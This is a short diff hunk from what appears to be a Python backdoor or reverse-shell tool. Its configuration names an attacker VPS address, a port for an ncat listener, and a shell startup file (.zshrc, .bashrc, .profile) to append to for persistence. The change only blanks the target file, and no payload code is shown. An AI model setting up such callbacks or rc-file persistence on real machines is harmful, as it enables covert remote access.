@@ -8,7 +8,7 @@ VPS_URL = ''
 # exposed port you'll be running ncat on
 VPS_PORT = 0
 # .bashrc", ".zshrc", ".profile" or any other shell setup script find in /home/[user]
-APPEND_TO = ".zshrc"
+APPEND_TO = ''
 
 class Daemon:
     def __init__(self, pidfile): self.pidfile = pidfile
